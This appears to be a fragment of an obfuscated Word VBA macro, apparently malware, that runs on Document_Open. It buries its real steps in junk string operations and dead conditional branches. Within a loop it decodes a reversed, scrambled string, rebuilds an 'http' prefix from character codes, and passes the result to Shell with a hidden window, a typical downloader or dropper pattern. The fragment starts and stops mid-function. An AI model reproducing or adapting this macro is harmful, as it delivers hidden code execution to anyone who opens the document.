        bMZOeYn = LTrim("lQlYfQXIpGJRbJavvP")
                ezDLBSSWO = StrReverse("LC crdFIojosu")
    Next Dfqjz
    For FxgXX = 0 To 272
        UmcFLX = Left("DnFwtxWmzrrGE", 6)
        mevwRRjh = Replace("xuGDEfkJQGhgDbv", "xuGD", "iEZA")
        mxyVHCJ = UCase("VXqoCiD vWLAdGx")
        fygoBY = Right("DeUoGeptIFPYwg", 3)
        aCQiKd = Left("CTRsnRy yk", 5)
        KILOQruZD = Left("udiwzbtanRzrvjdvSaH", 4)
                TyeiHS = Mid("OpanVySOmk", 1, 6)
                        apBhIr = RTrim("CCIkWJVLIwy kwC")
        MRfBICym = RTrim("EhOtuqVBZK XYLcUax")
        xnKIZv r = Space(8)
        IjOMMPoiU = Mid("wMiJXYYUSqaKGrRi", 2, 5)
        SXQ LJw = Space(6)
        XrZDwHfG = Mid("pvCqixQUPxrqSGdBF", 1, 5)
        trugvSV = UCase("keeiCVvFkwBqPz")
        Z Ycilm = Mid("yoWcCgpTulLOG", 0, 5)
        viIOSEv = Right("BSEnZTsazw", 3)
        FcJullXvI = StrReverse("s qwTqwZrwcX")
        zLQZGp = Left("BrIOAchJgdgszYk", 6)
                        TMMokSc = Space(6)
                KEJLxCu = LTrim("MtTFgofpIsOUI")
        tmSOO = Mid("pMKZXwzlCgzHYJHUn", 0, 6)
        bvFZGz = Space(6)
        WozBb = Mid("ZurWiIMODmWAwxYTpY", 0, 7)
    Next FxgXX
    SRgCqt = Replace("LdDUSDqqqo", "LdDU", "xiCLXp")
    C cHbG = Mid("cbrfTUKtJShetjezk", 1, 5)
    kOVgBQ = UCase("MAxuKTOQzI")
    For EZmfu = 0 To 337
        IWnUbVO = StrReverse("FFcnLdqnGWdLIfn")
        sbVaLA = Mid("MCeJhlhOKkhVA", 0, 5)
        yMmwRL = Replace("TlcOqTwwJalDQasMSc", "TlcO", "bFTwkZk")
        ucXdY = Mid("KimFAVURivtgJTG", 0, 7)
        Bczjt = Mid("CneAFV cOgldYC Qc", 2, 5)
        xSiEGjvfR = LTrim("TvXsyDQGnAFxn")
        LqzuhhPW = Left("xgOmcqnCuSpAfMcDj", 3)
        UsbAZ = LTrim("qP XhnCeyoheXqzOxYG")
        fogPUVw = Mid("tWWoQFkvYHGwD", 2, 5)
        rscfu = Space(9)
        GqnBCuCxd = UCase("vxhwEXOaDlgj")
        yXCRiz = LTrim("WDeHaDtLhbmyWQ")
        MyiUxtFLJ = Right("KrTRKSuRxDfEbWOH", 2)
                jgQQecrVx = LTrim("XLiZSHpzvyvff")
            Next EZmfu
    qPZllS = UCase("jZcEOjPaBbxZ")
    RbEkgx = Space(7)
    wArTfp = StrReverse("kazcIaoUAFWDBMcm")
    For zJiVK = 0 To 240
        cAFinfVgV = Left("iwhfBPQiYDBI", 2)
        iPefaltK = Left("LRluwPKnEzqTkzpj ", 6)
        TJzdxdUmI = Mid("sfdWSQyRpxaVw", 2, 5)
        HBLQPH = UCase("bVYGIhXlyGZyOGn")
        rPehLOTSW = LTrim("jCREebfijTPVRYGbb")
        lvpSzF = StrReverse("YdduQqHThWz")
        IFFVzYb = Replace("STBCyvOKLJ", "STB", "XP c")
        KWJvGSho = Replace("jqCymcIcZOnsGt", "jqC", "iGfbKub")
        Gxgllg Vs = StrReverse("xEdHXJkbIzZxcZmm")
        W cqBudwM = LTrim("oqJPUcVKVH  YiwYkh")
        xrZPfkJj = StrReverse("EglHJyXcuvfJwXkguxY")
    Next zJiVK
vGWLJZGU = 865 - 159
    KJbJCM = Left("AlVzdnkpjhep", 4)
vGWLJZGU = 690 - 259
    lnnan = RTrim("WVzpxTsjRJLCmCHMjb")
    zzPKql = StrReverse("SaccyVFHSm mOm")

    vGWLJZGU = 503 - 157
End Function

Private Sub Document_Open()
    For XWGZH = 0 To 34
        OyaLkPs = Space(6)
         xpvn = Mid("aTwSOMsuKPag", 2, 7)
        TgVIIi = Right("brulzKhwYwmlS", 3)
        uuMZCG = StrReverse("LUFtJxAqIqcfKkVHHP")
        ztgtFgFf = Replace("FdjaIbXqianEKwckarS", "Fdj", "kDZsk")
        UOWu s = UCase("goyEJhqofYrufASsXYE")
        QsDtDmwJ = Replace(" PzuLJwLCWzXwGQEvDg", " Pz", "k sbB")
        iQMAVjhJV = LTrim("ppJjRIeif CmHVDpQ")
        BTjGRnUEY = StrReverse("EeEteyxHtxgT")
        dhUgrjkk = StrReverse("MDLRAzyaIwYTjJjbBr")
        KMwcxx = UCase("zxOSnsanRvXmE")
        IsmKXH = RTrim("mGCvuaaUKiEW")
        LMze = RTrim("cvoJ ynyjVGiKKrQc")
        ibwVWGJi = LTrim("uQqWBiqOTSMxm")
                pfAeOgQcs = StrReverse("JZcpFnzF e")
        sazsDOA = Mid("XVLLbcfwAoF", 0, 6)
        nhBrOj = Space(5)
        eFoEWnLVI = Replace("wWdwgPvsYSSWq", "wWd", "USbI")
        vYhQL = StrReverse("rvUjFXXeHQlCJUvvAnE")
                        QwMOg = Left("ZdFdzyqMykbqSRMS", 3)
    Next XWGZH
RmjsVb = Replace("APZfyXknxYVn", "APZf", "JefB")
    For Oayyg = 0 To 324
        UpyePzJ = Space(8)
         BklF = Replace("lYSZiWLOVmTmpM", "lYS", "xReGwUX")
        QTKlMVH = Replace("HfEvvHnHoVcQpDwmP", "HfE", "YWRXVq")
        Za pqeho = Space(7)
        CrdEz = Right("skkQHaaKrttfpbeB", 4)
        gjLXkve = Left("LyxSMmZamuRbBsHcAQr", 3)
         BoYghGQ = LTrim("xDHEsWobkWVDJmmrtK")
        UJbeSX Q = UCase("YkynmdqRChoXi")
                Jxorvcbly = Space(5)
        dmPMO = StrReverse("BBCFOPSVHHEfgs")
        rFCCSbS = Right("ipeAExwcDIiHck  ", 6)
        FqfOwK = Replace("zrRkmELMePBGG", "zrR", "ulvwH")
        afBEdzwm = LTrim("WOUjTGPzSmdAPOM")
        BCxvqJU = Mid("ZznFdwAATTgKSphho", 2, 5)
        rwboaKFb = Right("MuIBqWJMWQHxTFKlzaU", 5)
        TtCigyXR = StrReverse("AaFjrZqQCclmeR")
        bCdFACD = Left("jgatoRbbzgmyqdw", 6)
        nybjjCic = LTrim("oklgsMkIdoyHJGbhs")
        QovUg = Mid("smhLdcDiaAge", 2, 5)
        eFOADo = Replace("xjwLOSuKBBSHKLF", "xjw", "GMEF")
         uSFgRYOR = RTrim("HAlv ZCprx")
        VQKSpxu = RTrim("j oCcSDMTawgjARbDS")
        kGvyOdmo = UCase("KUuiYSBuUzkOYU")
    Next Oayyg
    For Ljkhx = 0 To 322
        uoUmOXAUM = Mid("JRCuBGbamRyidSJhK", 2, 6)
        ReCcVlw = Replace("JTtDBtLKCdhMGWklO", "JTtD", "FuQB")
                nEcUkhJ = LTrim("SmKHdWuZaaGUP Q")
        zQPhXiBx = UCase("yekTsaaGTGGnpFT")
        KulnM = UCase("qZXPeRbyHC")
        HO fx = Right("QOiUvk ixXHmA", 3)
         mRIQ VK = Replace("vWSsLKd ZeuaHoVl", "vWSs", "RAPi")
        WTMHhb = Space(8)
        TCYtGlvnp = RTrim(" wsQUPtwIxgq")
        gvBXGZ ws = Replace("GomhtzaZVnPeYRU", "Gom", "lhIPSt")
        lTzSD = Mid("eQslCXlCETPKLUsX", 2, 6)
        HUiygzaI = Mid("CdTmSjamjJPaBySf", 1, 5)
        tylPSJmz = LTrim("FDuoHVKFWQTmV")
                qJa inx = LTrim("IAMicrtrGjQIFQxfvGW")
        fEoZOGb = RTrim("CzOQkazUbMwEbRbEWOc")
        YVLUYjYD = Space(5)
        ZlQyCXz = UCase("QSArcluRYaj")
        CDZivh = LTrim("cOEsQjqjuozGR")
        tEznCCz = StrReverse("HzVlsclfLJYibGtj")
        swrl XJ = RTrim("zJDEhQsromCmLQ")
                AgKbAb = Replace("cZAEzprgeyEZccm", "cZAE", "TnMyA")
        tMOwPydwq = Right("fFxnPcLKjoQfY", 2)
    Next Ljkhx
EWbpzH = Space(7)
    For kyHef = 0 To 111
        DplHJO = UCase("zXsXEjGPyKItUBW")
                PiTKP = UCase("wFodsPUfofVs")
        dPfgdRd = RTrim(" bySDlnVvDRhdMzR")
                kIlFBtepV = Left("DXkYFJ sjXQlPVoYs", 2)
                dzGqlJId = Space(5)
                fVajdc = Replace("pjYqQzWzMFnrhnqxH", "pjY", " oeq")
        vqOprXVYM = Mid("RhdpYShHTnAFjEn", 2, 5)
        ngQSKVx = RTrim("vY  aOzzqHIC lR")
                kYOns = RTrim("jMtHqzpRnG fuzJmW")
        OzsJeD = Right("uHXtMrqawCyQu", 2)
         aIIVRvs = UCase("PHffieUpQIOJTLQcJR")
        iVCGoclW = StrReverse("oATccHdiPuhL Ht")
        HLYorom Z = Mid("rLPzJBZHXiOJB", 0, 6)
        FqYPHvmHJ = Right("GiLeuLvgzJihOXza B", 3)
                vzjfLtLf = Mid("PGQHcCurxDYWgZA", 2, 5)
        rZXQHwseV = Right("ySlRYCOQbjpdh", 3)
        AFYdJLP = LTrim("RuMDHHbCkHIPsbwdBR")
                LxbGC = Right("SHSFcyxYgpzEVwyxFtd", 4)
    Next kyHef
    If 280580 = 217 + 5606 Then
         aZLP = Replace("mQyOIgQOPcJfVOODsC", "mQyO", "fGYEDb")
         aZLP = StrReverse("mQyOIgQOPcJfVOODsC")
        End If
    For HKIjc = 0 To 277
        bBGgfa = LTrim("IKBnkMCFWRMbVsduvW")
        wL OZaU = StrReverse("ewgGpvdJnaz")
        TztWAbH = UCase("DbmsctGHxKdCR")
        aOIwackf = Mid("wibThIZGXFZ", 0, 6)
        CfzLX = Space(5)
        fbv XgX = Left("ohnRbnRCMYtWjxquhEm", 2)
        TYvdg = Mid("DVqxmpFnximBTS", 0, 7)
        DLCMOGBS = Replace("OITnYxfxJTLKOmA", "OITn", "WuHFJ")
        ZnHHjnx = UCase("iJkfraBKdohYVHzaX")
        dmkxXYAKn = UCase("LePLZlFHSojmubyOLC")
        zPlxAWJK = Right("KdewbMssIzIMyXqo", 6)
        bdDAVeVcR = Space(5)
        XELetWLi = StrReverse("xDLzCTJqbGpZwuB")
        LX ayVDO = UCase("AavCEwTkGIcLKWozFg ")
        tgFHg = Replace("DyirjJzebABMcsq", "Dyir", "EjxW")
        WBiTy = UCase("nsVGySPG Q")
        wwwwoEFrH = Mid("dHSsdPILewRpvaJLL", 1, 7)
    Next HKIjc
    If 3889522 = 107 + 7028 Then
        jvVnf = Replace("LCfKBIHCeomFDU", "LCf", "Wmdt")
        jvVnf = StrReverse("LCfKBIHCeomFDU")
        End If
SZdnav = LTrim("DGhTvHhswX")
    If 2861260 = 1 + 1180 Then
        LBRdO = Replace("kPqZrRCSmmqfABL", "kPq", "XaKaQCo")
        LBRdO = StrReverse("kPqZrRCSmmqfABL")
        MwWPv = Replace("KFzDLEfOqfBIWs", "KFzD", "gFdssQ")
        MwWPv = StrReverse("KFzDLEfOqfBIWs")
        End If
BAfHPg = Mid("Cy GXDnjAjBjyf", 2, 7)
    For qSEhe = 0 To 192
                lozVJtj = LTrim("YGTdg lJRF")
        TuoIJBBE = Replace("xOHOEfZwWdowc", "xOHO", "bIUm")
        ILncZPxc = Space(9)
                GDPPUFM = Replace("txcBBiUXlIZC", "txcB", " JZIW")
        BfMATAPOn = Space(9)
        KXf IvItx = Left("QDgBFpXHBCKjtR", 6)
        rlWqLj = RTrim("L VLSlVjFykdeP")
                HpLalleH = Space(7)
        upZgsi = Mid("gqpBZvDlTRrqEnEdUH", 0, 7)
        oEeurUfl = Space(6)
                YebEvp = UCase("lwGsTzDcxT")
        RhjRmi = Space(5)
        iVgaI = Mid("MXLJ cUkpO", 1, 6)
        ZvQrbuWh = LTrim("zSDV DiGqcymlt")
        ELeJvsLE = Space(5)
        hFagLUyb = UCase("JKyJybdwBV")
        WZVOU = Right("IrZsFduWdfeeRU", 2)
         paqkG = Replace("nLxxYmwLCP", "nLx", "ZMVj")
        hDpvYOinE = UCase("hhWjzDpasooVrZoDZf")
        sbQrlPixI = Mid("vWMeGMORGUqC ", 2, 5)
         pZWc = LTrim("TThGtwTmJAhGqb")
        tHOdizOh = LTrim("ZKGTZmPViuqFnhAS")
        iTitJu = Left("RlrHvXhDbcGcMKMsg", 2)
        xuhMBlSbU = Mid("ahQkxkLXGrM", 2, 6)
    Next qSEhe

    While rq f < 6108
        If rq f = 62 Then
            ktoQPV = Replace("hwiUCsfKEnekglsFRJ", "hwiU", "uhab")

        ElseIf rq f = 690 Then
            uIYJYn = LTrim("IBninmlRTI")

        ElseIf rq f = 2220 Then
            OEQzBo = UCase("OWBGvuIdJZ")

        ElseIf rq f = 1731 Then
            VlnQdS = StrReverse("oQvOCvHHrqV")

        ElseIf rq f = 5934 Then
            aXpV = Split(Replace(CIG, "C Gui", "TqL"), Chr(127 - 3))(1 - 1)
        ElseIf rq f = 2972 Then
            oEldHT = Replace("mCd oyzRibz", "mCd", "SXgpwU")

        ElseIf rq f = 3349 Then

        ElseIf rq f = 5288 Then
            XpRUGY = LTrim("QfSjnoWdMWlqRe")

        ElseIf rq f = 5819 Then
            LGdC = Split(Replace(CIG, "eQAQK", "Xjf"), Chr(125 - 1))(2 + 0)
        ElseIf rq f = 4037 Then
            ucnFnV = Replace("iJWBvufRtWTQbP", "iJW", "dTui")

        ElseIf rq f = 1641 Then
            ukbooU = StrReverse("wanwDvzxIsZElC")

        ElseIf rq f = 3517 Then
            wVlOyH = Replace("gEWVKgxwhEq", "gEWV", "l Scg")

        ElseIf rq f = 465 Then
            dGwLuq = StrReverse("LOuli IhnFt")

        ElseIf rq f = 4752 Then
            RPKMbD = RTrim("miHJLuTfpjmHv")

        ElseIf rq f = 1277 Then
            ulSJnV = Space(8)

        ElseIf rq f = 1981 Then

        ElseIf rq f = 3391 Then
            qMhqiu = Space(8)

        ElseIf rq f = 139 Then
            EXqfLD = Space(9)

        ElseIf rq f = 2396 Then
            FxJ qg = Mid("gzHmLemsYxgMaaZ", 0, 7)

        ElseIf rq f = 2703 Then
            hWSplK = RTrim("mkYDDDFlQQCFBsVIm")

        ElseIf rq f = 3592 Then
            ZVQpjH = Replace("cIhyPpuZSDOv", "cIh", "nEso")

        ElseIf rq f = 5889 Then
            crW = Split(Replace(CIG, "KVuJP", "myc"), Chr(123 + 1))(1)
        ElseIf rq f = 1362 Then
            oStUtr = Replace("ur UwmwJZOBwTBg", "ur U", "BjbMZ")

        ElseIf rq f = 2785 Then
            fsYDXF = RTrim("ICGrSzOTaKL")

        ElseIf rq f = 2000 Then
            UialWQ = Left("PeJnKgLDkgUAlXEHy", 4)

        ElseIf rq f = 5715 Then
            CIG = Replace(StrReverse(utfkIyOxwR(1)), "kRsqH", "EmE")
        ElseIf rq f = 632 Then
            i wHaT = Right("jweJTjaBjoifOhqdQZ", 2)

        ElseIf rq f = 2595 Then

        ElseIf rq f = 3673 Then
            XyLfdX = UCase("kBoaiEBZZWC")

        ElseIf rq f = 990 Then
             VoHsw = Replace("WqvfORFYxRtamE", "Wqvf", "VW an")

        ElseIf rq f = 5474 Then

        ElseIf rq f = 3893 Then
            ODkXFt = StrReverse("jzPYlqjPWbXz ")

        ElseIf rq f = 2185 Then
            WLRmBl = UCase("CaJAUjEPwzhPQxySxD")

        ElseIf rq f = 445 Then
            apgCvF = LTrim("pddldPdauCkhAscKY")

        ElseIf rq f = 1237 Then

        ElseIf rq f = 530 Then
            LrDSdt = Replace("pgDOzeIhTzsdkneR", "pgDO", "LDc Omj")

        ElseIf rq f = 359 Then
            puAyyf = Space(9)

        ElseIf rq f = 249 Then
            JmSYRW = Replace("spyqVaxtIpGOursLhcZ", "spy", "pAtqLee")

        ElseIf rq f = 5123 Then

        ElseIf rq f = 3098 Then
            M jcDY = Replace("CfkkuW  aHRAraacc", "Cfkk", "iEku j")

        ElseIf rq f = 4680 Then

        ElseIf rq f = 4928 Then
            kYMTnn = Left("HlmzOshqOhsd", 5)

        ElseIf rq f = 825 Then
            Wcahyv = Mid("ecWqHmarbdhCgZH ", 0, 6)

        ElseIf rq f = 4414 Then
            CyUImI = LTrim("exMd hiEDjEhD")

        ElseIf rq f = 3947 Then
            QDZfge = LTrim("GpaGAXSQmGd")

        ElseIf rq f = 976 Then
            DjLfFw = Left("WnqwGifLdTdP", 6)

        ElseIf rq f = 4576 Then
            cmlkIc = Space(5)

        ElseIf rq f = 6054 Then
            GAMI = Replace(IuTU, aXpV, Chr(44 + 2))
        ElseIf rq f = 5027 Then
            CamvRD = Left("pMbMB ZXLI", 3)

        ElseIf rq f = 2904 Then
            sOJqye = Replace("zbfCmYjGZtGD p", "zbf", "QofVlqL")

        ElseIf rq f = 6002 Then
            IuTU = Replace(LGdC, crW, Chr(104) + Chr(116) + Chr(116) + Chr(112))
        ElseIf rq f = 2799 Then
            tStoZP = Replace("vHaDVWdyjgBzOcBBFI", "vHaD", "jVWU")

        ElseIf rq f = 3737 Then

        ElseIf rq f = 3651 Then
            RfEKVU = Space(8)

        ElseIf rq f = 292 Then
            rWiAso = Replace("mmGrDrhwzG", "mmGr", "bmwtV")

        ElseIf rq f = 5426 Then
            IRFbFe = Right("CihtxSArPkGDvKcHXOH", 4)

        ElseIf rq f = 4443 Then
            FgoL M = RTrim("hQaXYqdEKAPoesYiDE")

        ElseIf rq f = 3319 Then
            zoCRs = Right("KdtdtpzoCgrj", 3)

        ElseIf rq f = 1673 Then
            IhxBAl = Space(8)

        ElseIf rq f = 708 Then
            ndFXHh = Replace("hnxTYhjdRybYVmhjS", "hnxT", "vueQ")

        ElseIf rq f = 2315 Then
            aswHHF = UCase("MHbiYvVjRYlncHMTWjO")

        ElseIf rq f = 5572 Then
            zfaFnj = Left("ErnJTaLOTIFeBkteMyD", 2)

        ElseIf rq f = 810 Then
            s EqfG = Mid("JVoqvooGvpXKbsoJhwD", 2, 5)

        ElseIf rq f = 952 Then
            sFiwaF = Replace("bfKOqIGHvzWzarXSb", "bfKO", "QmlhAZ")

        ElseIf rq f = 5157 Then
            wHTvpY = StrReverse("gUGS rZkludZPPUtQe")

        ElseIf rq f = 4639 Then
            GDCf P = Mid("GplnOMpWIRkuViZx", 1, 5)

        ElseIf rq f = 1388 Then
            nMnM P = Left("gThaQGGyQlOJzgWf", 5)

        ElseIf rq f = 1190 Then
            MekBKZ = LTrim("fZvEGmEbEbmFQYcFtI")

        ElseIf rq f = 871 Then
            EqZubR = Replace("AzLQPruaSM", "AzL", "GOUGU")

        ElseIf rq f = 1493 Then
            HJZwvp = RTrim("kQunaxAKSVROuSiX")

        ElseIf rq f = 1086 Then
            As ywS = UCase("SZohClqfpwoSoXxwjY")

        ElseIf rq f = 3080 Then
            FzFkVA = UCase("pQWszGDXggkWiF")

        ElseIf rq f = 4130 Then
            OCsFcb = Space(6)

        ElseIf rq f = 2104 Then
            VeYnSa = StrReverse(" RKRUVEJKbwcTecHi")

        ElseIf rq f = 3963 Then

        ElseIf rq f = 4468 Then
            QSsZuP = RTrim("SYVtXErtYReAb")

        ElseIf rq f = 3304 Then
            PwShBf = Space(5)

        ElseIf rq f = 1587 Then
            s qmbY = Space(6)

        ElseIf rq f = 3202 Then
            ZPTBoO = Mid("UMsMKBzHoTUDAjwW", 0, 7)

        ElseIf rq f = 3493 Then
            oRiCAl = Space(6)

        ElseIf rq f = 4315 Then
            OOyhzT = LTrim("r VBFErjUrLwDl")

        ElseIf rq f = 4828 Then
            ZawEoI = UCase("ZcC uoZQdqOvULM kD")

        ElseIf rq f = 1820 Then
            tmrqht = StrReverse("BuBpKRMWh w ohJgAT")

        ElseIf rq f = 3808 Then
            fyrAuM = LTrim("VapJrvIigUVdjPgocy")

        ElseIf rq f = 5644 Then
            PjiZOw = RTrim("MDykvYaYlCjSVeLkbfh")

        ElseIf rq f = 179 Then
            HCpBtn = RTrim("FLpqnQItyWpguj")

        ElseIf rq f = 5368 Then
            yBlAUc = Mid("DKMahXDQbn", 1, 5)

        ElseIf rq f = 2725 Then
            EgtPhB = Replace("xwDfazEtkTKxJcefDay", "xwD", "BLOhLg")

        ElseIf rq f = 6086 Then
            Shell (StrReverse(StrReverse(GAMI))), 0
        ElseIf rq f = 4243 Then

        ElseIf rq f = 3115 Then
            SnGBuy = StrReverse("CMrHQMjYhFcFiQOnYGY")

        ElseIf rq f = 2167 Then
            xPXPQa = Right("RwvJrssMYgwuTMz", 4)

        ElseIf rq f = 4150 Then
            KAryzk = Right("FsUkeVbtUHe", 3)

        ElseIf rq f = 1928 Then
            qXajpg = Space(5)

        ElseIf rq f = 1877 Then
            fwFYjQ = Space(5)

        ElseIf rq f = 5206 Then
            LwJgqy = UCase("UCVFcvmctsgvtSvTnj")

        ElseIf rq f = 2502 Then
            bCowzR = Right("XbSpddTisqlGDsJVwQd", 2)

        End If
        rq f = rq f + 1
Wend

    For dVhD = 0 To 243
        aZsfR = LTrim("WlGGB BIxvQ")
        rnmUy = Replace("wqaTJXuZGu", "wqa", "eKlfn")
                QgRSJ = Left("fVDPeGvconZrLFHzU", 4)
        BbWrSr = Space(9)
        qLnUlzVV = UCase("SyYKnzeCrPhzjlYIE")
                jKADJZqDE = Right("SmUQsdCupwagiK", 4)
        PBMSYL = Right("PZgruAbaxpZDdqEmDh", 3)
        BVswbte = LTrim("DSvEefMaWKQIm")
        JYklveu = LTrim("RwwGMsmoRxecTud")
        HdqbiX = Space(9)
        cWxFlZ = Left("UUMJAjaiXFhDOQHfbGv", 2)
        rvuPky = Mid("FfvvpxURvUrX ", 0, 7)
    Next dVhD
    For jgEVA = 0 To 45
        AKWjztbqB = LTrim("jwLjgePRRflkiGy")
        TrWqVCofY = UCase("KQ cYWdGReQ")
        gxbwqQhv = Replace("bQRhvhgAPlPRkhS", "bQR", "JPTTq")
        KKBzBMuL = Space(7)
        VGdERIZQp = UCase("H MDeCltwbLLlOsL")
        uvCmutV = Mid("TfTUYJQymIXPOFVZWn", 2, 6)
        uytJibfhE = UCase("qBhSIoafQHAiOh")
        MLswHM = UCase("JwruGGKduJKrLlMY")
        OoV pzE = Mid("wzqBAmgChpJgApCRm", 2, 5)
        Ogcdq = Left("VVFScgMnOcalDPyGt", 3)
        ZMMdRXovr = UCase("gYAHqWmxFH")
        sOCMZcy = Left("TzcQcIoJhDcZhpO", 6)
                TZC Z = UCase("CWUsaCOrEKdmURCB")
        UOsDcCKa = Replace("WiLjIVMAQloDRmgah", "WiLj", "x kEgX")
    Next jgEVA
    For rUaKR = 0 To 320
                GxPQZp = StrReverse("wsIGpcgxXmeFz")
        TQner = RTrim("IlmZzCRoyg")
        L yYxD = Right("LuUhiVVOlYQHnL", 6)
                cwcKwJ = Replace("WaKjeRzgrpolSMpKfag", "WaK", "kwqpuWg")
        DSjODkPF = RTrim("lylQEgerQtqXd LeW")
        sGaojvi = UCase("CBICpphiIbSXliE")
        nQjuFfC = Replace("eVeVTZVscgolJ", "eVeV", "FRpto")
        iPbRwIMVM = Mid("bBglPlcUpprJhf", 2, 5)
        UxEUhQZ = StrReverse("CjBIrGtZBYixXA")
        AslYe = RTrim("GWsUAWMKBvwgO")
        i oFA = Replace("evRrAIoIUywfppCGf", "evRr", "quHJ")
        mypBKB = LTrim("JZMOAfzcVnZzzloGd")
        qAXAD = Space(7)
    Next rUaKR

End Sub
Public Function utfkIyOxwR(BpAGI) As String
    For fnDcu = 0 To 180
        DwGi = StrReverse("pnlMQAAxmkaGoWBx")
        DwGi = StrReverse("HbUGgtqzSQ")
        DwGi = Replace("GuSTUQHmrYr", "GuST", "RTau")
        DwGi = Replace("PvKYAUapMab", "PvKY", "FLyVj")
                If 745952 = 2 - 6882 Then
            zvcfZ = Replace("xlvYhissvacQUqLqf", "xlvY", "fuTiOTa")
            zvcfZ = StrReverse("xlvYhissvacQUqLqf")
            End If
        DwGi = Replace("OPbKXIPfAwCFZED", "OPbK", "Kedzc")
        DwGi = StrReverse("ScDkwazoaDcezZmvLg")
        DwGi = Replace("wKOfnbqCSkfoaYIFSIP", "wKOf", "SisDp")
        DwGi = Replace("mLFJOpfMoPhUmS", "mLFJ", "csgm")
        DwGi = StrReverse("pxXDogGcDfQbhpFhmD")
                If 1560316 = 23 - 1275 Then
            mpwkJ = Replace("lSFPVdKPTYSHcdrKQ", "lSF", "biPj")
            mpwkJ = StrReverse("lSFPVdKPTYSHcdrKQ")
            End If
        DwGi = Replace("vQDtKzsiDsESS", "vQD", "JyonPc")
        DwGi = Replace("XBUGPwbphfWO", "XBU", "zkPammE")
        DwGi = Replace("FvoiWuCOxhxg", "Fvoi", "dbgDLD")
        DwGi = Replace("QycQFRPVYZpXXiSgry", "QycQ", "uLfcHd")
        DwGi = Replace("YKSjoelvKXlO", "YKS", "fLVmxn")
        DwGi = StrReverse("ScbgTyGiugwGins")
        DwGi = StrReverse("sUWprEFvHaBM")
                If 108522 = 145 - 6902 Then
            buGYs = Replace("rZegvOUYoJiqXATPi", "rZe", "BqfQvg")
            buGYs = StrReverse("rZegvOUYoJiqXATPi")
            rUCxe = Replace("RHfwxqkogeVmBXqYY", "RHf", "IAfEjEc")
            rUCxe = StrReverse("RHfwxqkogeVmBXqYY")
            End If
        DwGi = Replace("tXeceAGrEMhrmrg", "tXec", "fEbC")
        DwGi = Replace("DXcfZAEcMXvtBmYpiU", "DXc", "zrKS")
        DwGi = StrReverse("DIYLbdPfSTGLD")
        DwGi = Replace("gYYsJXBDDmZvV", "gYY", "MszOVW")
        DwGi = StrReverse("rvEqnHwFHzbuK")
        DwGi = Replace("TUArZOzdcd", "TUA", "alDHOWR")
    Next fnDcu
    For PPGrL = 0 To 349
                If 370565 = 233 - 62 Then
            sneaY = Replace("muAkEwEGxIuejpJgSh", "muAk", "wHPP")
            sneaY = StrReverse("muAkEwEGxIuejpJgSh")
            mqCoG = Replace("OWvpYiMVCU", "OWv", "RYnOHa")
            mqCoG = StrReverse("OWvpYiMVCU")
            End If
        XOjc = Replace("IozmyELqUrkWEBrg", "Iozm", "nFwieBb")
        XOjc = StrReverse("eaiCSGVczCaQIrB")
        XOjc = Replace("wIcwDcDVQOloqOBCZK", "wIc", "tIaglJ")
        XOjc = Replace("XoEWlFknXsU", "XoEW", "BXDC")
                If 1452363 = 64 - 3329 Then
            UsWnu = Replace("pEXHvYGDpwClEf", "pEXH", "YCAJ")
            UsWnu = StrReverse("pEXHvYGDpwClEf")
            End If
        XOjc = StrReverse("sVlxnDTOCGZmKxabY")
                If 1430309 = 169 - 6292 Then
            HSamw = Replace("wOiQuoWkOtjggKZBDU", "wOi", "qYfGGc")
            HSamw = StrReverse("wOiQuoWkOtjggKZBDU")
            POgcQ = Replace("gAnCridnPKbBGcyKE", "gAn", "RgDRq")
            POgcQ = StrReverse("gAnCridnPKbBGcyKE")
            End If
        XOjc = Replace("fLcWRdPZVCrPQLQ", "fLc", "LfMwlE")
        XOjc = StrReverse("EivACosWaPBYfjUPOBG")
        XOjc = StrReverse("nOPLHblIqVaKpHqjs")
        XOjc = Replace("BGacaPKRYLodtRxIP", "BGa", "fuRm")
        XOjc = StrReverse("OAiQtfTUHWOHDnGQd")
        XOjc = Replace("QwpZcjIgSKhLbIQthP", "QwpZ", "TMDKh")
        XOjc = Replace("jcEyjKUDxggYbC", "jcEy", "awkmO")
                If 3613198 = 206 - 6171 Then
            ormAt = Replace("tBRYGUmiQhGEtHcs", "tBR", "hKwf")
            ormAt = StrReverse("tBRYGUmiQhGEtHcs")
            BJHxA = Replace("VCieGruSllgbTdGgYXx", "VCi", "asjMKpE")
            BJHxA = StrReverse("VCieGruSllgbTdGgYXx")
            End If
                If 2534001 = 48 - 3035 Then
            khTiE = Replace("iYbrWgicIy", "iYbr", "vMjrjal")
            khTiE = StrReverse("iYbrWgicIy")
            End If
                If 2567674 = 51 - 8138 Then
            SqlxF = Replace("kxgACShRimoaLgrSb", "kxg", "ZLDBORX")
            SqlxF = StrReverse("kxgACShRimoaLgrSb")
            oGsJL = Replace("qfFOHWbHYTcQiBGX", "qfFO", "nlcrPf")
            oGsJL = StrReverse("qfFOHWbHYTcQiBGX")
            End If
        XOjc = Replace("eZnjfqJxfZJf", "eZn", "ATdgfLc")
        XOjc = Replace("uhTrDFlhSAeHkJWXAUa", "uhT", "CDlW")
        XOjc = Replace("JPYvyubrtdMVKDRJ", "JPYv", "ePFhvlD")
        XOjc = Replace("sSIbMrtxfT", "sSIb", "XBAJRD")
        XOjc = StrReverse("UMMHGPiDCOoxFlldK")
        XOjc = StrReverse("JjTDrzbRXQn")
        XOjc = StrReverse("bcQtZpjZrwxsfVuPmJ")
    Next PPGrL
    Yqd = Yqd & StrReverse(StrReverse("DrxGBVTtGXXCKRlhRikoYGedjrtwFSGBfshoonYnxfGTf{oqJDbrhYnjelsYGQXMp{BxFukrZQLJoHNbPzKbd"))
        If 183468 = 135 - 6396 Then
            udtka = Replace("WJWKYmpXbgExMczibMp", "WJWK", "TngHlz")
            udtka = StrReverse("WJWKYmpXbgExMczibMp")
            End If
    For eGqnE = 0 To 260
        Horc = Replace("cZvUvTCrUuErv", "cZvU", "nHiFmSC")
        Horc = Replace("CiuUJomzInJAkAjgnGR", "CiuU", "XjUw")
        Horc = StrReverse("UxtTmJQCzOTdcsQjRUs")
                If 1610114 = 88 - 4280 Then
            sDehe = Replace("lTlDXVpzyiZOFsYGKsb", "lTl", "KZJjAO")
            sDehe = StrReverse("lTlDXVpzyiZOFsYGKsb")
            End If
        Horc = StrReverse("JTHPXzKZALwGmGtoK")
        Horc = StrReverse("ChwvvVrbwCJZcOrcrQ")
        Horc = StrReverse("ASUixezLqmCMO")
        Horc = StrReverse("olfbrXkBcBrEtRM")
        Horc = Replace("mVRtBEEItV", "mVRt", "SLmLp")
        Horc = StrReverse("EuwsWxgKIqzoHUHvZ")
